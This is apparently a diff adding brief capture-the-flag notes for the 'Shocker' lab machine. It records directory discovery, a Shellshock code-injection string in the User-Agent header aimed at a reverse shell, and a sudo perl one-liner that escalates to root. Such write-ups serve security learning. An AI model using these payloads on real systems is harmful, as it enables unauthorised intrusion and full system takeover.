@@ -1,0 +1,13 @@
+80, 2222:ssh
+
+foothold:
+gobuster reveals http://10.10.10.56/cgi-bin
+further discovered /cgi-bin/user.sh shows that cgi-bin is running
+name "shocker" suggest shellshock
+code injection in USERAGENT request: () { :;}; /bin/bash -c "reverse shell"
+foothold as shelly user
+
+priv esc:
+sudo -l shows (root) NOPASSWD:/usr/bin/perl
+gtfobins: sudo -u root /usr/bin/perl -e "exec '/bin/bash -i';"
+rooted
